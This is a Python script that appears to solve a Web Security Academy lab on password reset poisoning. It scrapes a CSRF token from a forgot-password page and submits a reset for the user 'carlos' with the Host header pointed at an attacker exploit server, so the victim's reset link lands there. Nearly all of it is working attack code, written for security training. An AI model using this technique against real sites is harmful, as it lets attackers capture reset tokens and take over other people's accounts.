#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

def get_csrf(url, endpoint_forgot_password):

    # Getting CSRF Token
    s = requests.Session()
    r = s.get(url + endpoint_forgot_password)
    p = BeautifulSoup(r.content, "lxml")

    csrf = p.find(attrs = {'name' : 'csrf'})['value']
    print(csrf)

    return csrf

def forgot_password(url, url_exploit, endpoint_forgot_password):

    csrf = get_csrf(url, endpoint_forgot_password)
    print(csrf)

    headers = {
        "Host" : url_exploit,
    }

    data = {
        "csrf" : csrf,
        "username" : "carlos",    
    }

    s = requests.Session()
    r = s.post(url + endpoint_forgot_password, headers=headers, data=data)
    print(r.status_code)


if __name__ == '__main__':
    url = "https://acf01f131ec49525c06c810d0090008f.web-security-academy.net"
    url_exploit = "exploit-acfd1fbb1ebe951fc0088114011000ca.web-security-academy.net"
    endpoint_forgot_password = "/forgot-password"

    forgot_password(url, url_exploit, endpoint_forgot_password)